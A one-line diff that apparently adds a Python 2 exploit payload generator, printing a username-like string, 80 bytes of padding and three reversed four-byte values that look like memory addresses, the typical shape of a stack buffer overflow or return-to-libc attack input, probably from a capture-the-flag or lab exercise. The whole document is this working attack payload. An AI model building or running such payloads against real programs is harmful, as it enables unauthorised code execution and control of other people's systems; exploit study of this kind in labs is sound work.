@@ -1,0 +1,1 @@
+print "dat_will" + "\n" + "F"*80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]
